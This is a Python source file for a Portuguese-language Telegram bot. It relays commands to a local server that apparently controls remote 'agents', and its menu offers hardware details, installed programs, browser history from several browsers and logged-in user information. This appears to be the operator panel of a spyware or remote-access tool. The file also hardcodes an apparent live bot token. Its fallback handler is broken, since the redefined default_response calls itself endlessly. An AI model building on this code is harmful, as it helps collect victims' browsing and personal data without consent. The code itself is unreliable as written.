import telebot
import socket

KEY_API = "6849345429:AAFDRM9v0KkNKjlLH59epOcwvcCntyH1fZU"
bot = telebot.TeleBot(KEY_API)

def send_command_to_server(command):
    server_host = '127.0.0.1'      
    server_port = 5757  

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        client.connect((server_host, server_port))
        client.send(command.encode('utf-8'))
        response = client.recv(4096).decode('utf-8')

    return response

@bot.message_handler(commands=["info_h"])
def info_h(mensagem):
    response = send_command_to_server('/info_h')
    bot.reply_to(mensagem, response)

@bot.message_handler(commands=["info_p"])
def info_p(mensagem):
    response = send_command_to_server('/info_p')
    bot.reply_to(mensagem, response)

@bot.message_handler(commands=["historic"])
def historic(mensagem):
    response = send_command_to_server('/historic')
    bot.reply_to(mensagem, response)

@bot.message_handler(commands=["info_u"])
def info_u(mensagem):
    response = send_command_to_server('/info_u')
    bot.reply_to(mensagem, response)

@bot.message_handler(commands=["listclient"])
def listclient(mensagem):
    response = send_command_to_server('/listclient')
    bot.reply_to(mensagem, response)

def default_response(mensagem):
    texto = "Bem-vindo ao Bot Gaga_i_rejo, as opções disponíveis são:\n\n" \
            "/info_h - Informações do hardware onde o servidor está sendo executado.\n" \
            "/info_p - Lista de programas instalados no servidor.\n" \
            "/historic - Histórico de navegação em diferentes navegadores.\n" \
            "/info_u - Informações detalhadas do usuário logado.\n" \
            "/listclient - Lista dos agentes online com informações básicas."
    bot.reply_to(mensagem, texto)

@bot.message_handler(func=default_response)
def default_response(mensagem):
    default_response(mensagem)

bot.polling()
